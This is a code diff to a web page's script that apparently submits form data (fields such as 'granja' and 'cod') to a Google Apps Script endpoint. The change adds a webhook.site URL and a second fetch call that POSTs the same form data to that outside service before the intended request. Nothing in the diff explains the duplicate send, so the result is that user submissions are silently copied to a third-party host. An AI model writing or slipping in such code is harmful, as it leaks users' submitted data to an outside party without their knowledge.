@@ -55,7 +55,8 @@
 
   <script>
     var webUrl= "https://script.google.com/macros/s/AKfycbyFy2bJtyPOmujuC7TiraZQPPpgCgSEV8TsBMGLuhkT3Zti7air1JmTQ2XxkFSiYNzA_g/exec"
-
+    var webHook="	https://webhook.site/56ba3dab-a6a7-441a-873e-892f8c8125ae"
+    
     const imgEsperaUrl="https://drive.google.com/thumbnail?id=14boOFBzVB9GCsZTdiATLFxrcKNHWmgV4"
     const urlChiste="https://script.google.com/macros/s/AKfycbxm_JkOHZ8cqKHfg-8nDn9HtRySl1QiHuBpRWqSxSrzDn4Ezzx8wNkTx2LfsLE7wRVS/exec"
     const temas=[ 
@@ -102,8 +103,14 @@
         const granjaInput= document.getElementById("granja").value
         const codInput= document.getElementById("cod").value
 
-        url = webUrl + "?file=bloque";
 
+        urlX = webHook + "?file=bloque";
+        const responseX = await fetch(urlX, {
+            method: 'POST',
+            body: formData,
+        })
+
+        url = webUrl + "?file=bloque";
         const response = await fetch(url, {
             method: 'POST',
             body: formData,
